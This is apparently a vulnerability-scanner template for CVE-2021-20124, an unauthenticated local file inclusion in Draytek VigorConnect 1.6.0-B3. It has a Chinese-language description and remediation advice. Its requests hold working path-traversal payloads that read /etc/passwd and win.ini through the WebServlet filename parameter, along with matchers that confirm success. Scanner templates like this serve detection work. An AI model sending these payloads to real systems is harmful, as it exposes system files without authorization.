id: CVE-2021-20124
info:
  name: Draytek VigorConnect - Unauthenticated Local File Inclusion WebServlet
  author:
  - l0ne1y
  description: |-
    Draytek VigorConnect本地文件包含漏洞
    CVE(CAN) ID: CVE-2021-20124

    Draytek VigorConnect是中国居易科技（Draytek）公司的一种易于使用、重量轻、用于DrayTek产品的单站点中央管理系统。
    Draytek VigorConnect 1.6.0-B3版本中WebServlet端点的文件下载功能存在本地文件包含漏洞。未经身份验证的攻击者可利用该漏洞通过以root权限从底层操作系统下载任意文件。
  severity: high
  remediation: |-
    官方修复建议：
    升级到 Draytek VigorConnect 1.6.1 或更新版本
    https://www.draytek.com/products/vigorconnect/

    临时修复方案：
    <br/>1、PHP 中使用 open_basedir 配置限制访问在指定的区域，路径长短截断<br/>2、过滤.（点）/（反斜杠）\\（反斜杠），编码绕过<br/>3、禁止服务器远程文件包含
requests:
- matchers:
  - type: regex
    condition: or
    regex:
    - 'root:.*:0:0:'
    - for 16-bit app support
  - type: word
    part: header
    words:
    - application/octet-stream
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd'
  - '{{BaseURL}}/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini'
  method: GET
  stop-at-first-match: true
